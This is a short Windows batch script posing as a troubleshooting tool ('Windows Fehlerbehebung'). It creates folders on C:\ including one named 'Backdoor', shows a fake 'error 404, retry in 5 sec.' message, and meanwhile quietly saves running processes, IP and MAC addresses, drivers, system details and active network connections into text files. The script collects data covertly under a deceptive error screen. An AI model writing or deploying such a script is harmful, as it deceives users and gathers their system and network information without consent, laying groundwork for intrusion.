@echo off
title Windows Fehlerbehebung
color f3
cd C:\
mkdir SystemS
cd C:\SystemS
mkdir Backdoor
mkdir ad-ons
mkdir systeminformation
cd Backdoor
cd ..
cd ad-ons
cd ..
cls
color 4f
echo ______________________________________________________________________
echo Error when opening the file
echo error 404
echo retry in 5 sec.
echo ______________________________________________________________________
cd systeminformation
tasklist > tasklist.txt
ipconfig > ipconfig.txt
driverquery > driverquery.txt
systeminfo > systeminfo.txt
date > date.txt
ver > ver.txt
w32tm > w32tm.txt
getmac > getmac.txt
driverquery > driverquery.txt
vol > vol.txt
chkdsk > chkdsk.txt
netstat > netstat.txt
cd ..
pause